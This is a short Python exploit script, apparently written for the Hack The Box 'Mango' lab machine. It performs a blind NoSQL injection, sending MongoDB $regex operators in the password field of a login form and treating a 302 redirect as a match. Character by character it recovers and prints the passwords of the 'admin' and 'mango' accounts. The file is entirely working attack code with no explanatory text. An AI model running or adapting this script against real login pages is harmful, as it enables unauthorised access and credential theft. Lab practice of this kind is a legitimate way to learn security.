from requests import post
from string import printable

url = "http://staging-order.mango.htb/"
valid_mango=['3', '5', '8', 'f', 'h', 'm', 'H', 'K', 'R', 'U', 'X', '\\$', '\\.', '\\\\', ']', '\\^', '{', '\\|', '~']
valid_admin=['0', '2', '3', '9', 'c', 't', 'B', 'K', 'S', '!', '#', '\\$', '\\.', '>', '\\\\', '\\^', '\\|']



def sendPayload(user,password):
	if user=='admin':
		valid = valid_admin
	else:
		valid = valid_mango
	for char in valid:
		regex = '^'+password+char+'.*'
		data = { 'username' : user, 'password[$regex]' : regex, 'login' :'login' }
		response = post(url, data = data, allow_redirects=False)
		if response.status_code == 302:
			return char
	return None



if __name__ == '__main__':
	for user in ['admin', 'mango']:
		password = ''
		while True:
			char = sendPayload(user, password)
			if char != None:
				password += char
			else:
				st = "Password for "+user+":"+password
				print(st)
				break




